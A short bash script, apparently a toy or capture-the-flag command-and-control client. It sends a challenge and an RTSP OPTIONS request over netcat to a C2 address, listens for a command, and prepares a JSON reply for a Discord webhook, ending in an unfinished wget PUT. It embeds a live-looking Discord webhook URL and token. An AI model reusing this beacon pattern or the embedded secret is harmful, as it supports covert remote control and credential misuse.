set -x

CHALLENGE="Bandits ate my Natass"
DEBUG=0
MAC_STYLE=1
WEB_HOOK_URL=https://discord.com/api/webhooks/1237246637814972507/gJCg8LBG6mHLBquE7iaQWP2UW7ak1uL5Eloz5MjJBS7U9utkUIsPDe5Fm4FavjfQUNnk
if [ $DEBUG == 1 ] 
then
    C2_IP='127.0.0.1'
    C2_PORT=554
else
    C2_IP="10.0.1.3"
    C2_PORT=23766
fi

if [ $MAC_STYLE == 1 ]
then
    NC_LISTEN_PARAMS="-lv"
    TIMEOUT_PARAMS=""
else
    NC_LISTEN_PARAMS="-lp"
    TIMEOUT_PARAMS="-t"
fi

CSEQ=$RANDOM
PORT=$((5000+($RANDOM % 10000)))

cat << EOF | sed 's/\n/\r\n/g' | nc $NC_TIMEOUT_PARAMS 2 $C2_IP $C2_PORT
$CHALLENGE
OPTIONS /KylerHowAreTheKids RTSP/1.0
CSeq: $PORT

EOF

if [ $? != 0 ]
then
    echo "LMAO: Couldn't connect to C2"
    exit
fi

COMMAND=$(timeout $TIMEOUT_PARAMS 2 nc $NC_LISTEN_PARAMS $PORT)

if [ $? != 0 ]
then
    echo "LMAO: Couldn't receive command from C2"
    exit
fi

if [ $COMMAND == "max is a bum" ]
then
    RES=$(echo "I am not")
fi

RESPONSE=$(cat << EOF
{
  "name": "test webhook",
  "type": 1,
  "channel_id": "199737254929760256",
  "token": "3d89bb7572e0fb30d8128367b3b1b44fecd1726de135cbe28a41f8b2f777c372ba2939e72279b94526ff5d1bd4358d65cf11",
  "avatar": null,
  "guild_id": "199737254929760256",
  "id": "223704706495545344",
  "application_id": null,
  "user": {
    "username": "test",
    "discriminator": "7479",
    "id": "190320984123768832",
    "avatar": "b004ec1740a63ca06ae2e14c5cee11f3",
    "public_flags": 131328
  }
}
EOF
)

wget --method=PUT --body-data=$RESPONSE





